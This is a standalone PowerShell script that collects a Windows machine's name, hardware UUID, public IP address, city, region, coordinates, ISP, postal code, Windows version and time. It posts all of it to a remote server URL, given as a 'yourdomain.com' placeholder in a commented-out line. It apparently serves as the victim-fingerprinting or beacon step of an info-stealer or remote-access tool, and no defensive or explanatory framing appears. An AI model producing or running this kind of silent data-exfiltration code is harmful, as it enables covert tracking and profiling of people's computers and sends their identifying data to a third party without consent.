# $url = "http://yourdomain.com/yourscript.php"
$pcname = $env:COMPUTERNAME
$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
$ipinfo = Invoke-RestMethod -Uri http://ipinfo.io/json
$ip = $ipinfo.ip
$hostname = $ipinfo.hostname
$city = $ipinfo.city
$region = $ipinfo.region
$loc = $ipinfo.loc
$org = $ipinfo.org
$postal = $ipinfo.postal
$timezone = $ipinfo.timezone
$winver = (Get-ComputerInfo).WindowsProductName + ' ' + (Get-ComputerInfo).WindowsVersion
$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$body = @{
    pcname = $pcname
    hwid = $hwid
    ip = $ip
    hostname = $hostname
    city = $city
    region = $region
    loc = $loc
    org = $org
    postal = $postal
    timezone = $timezone
    winver = $winver
    date = $date
}
Invoke-WebRequest -Uri "$url" -Method Post -Body $body
exit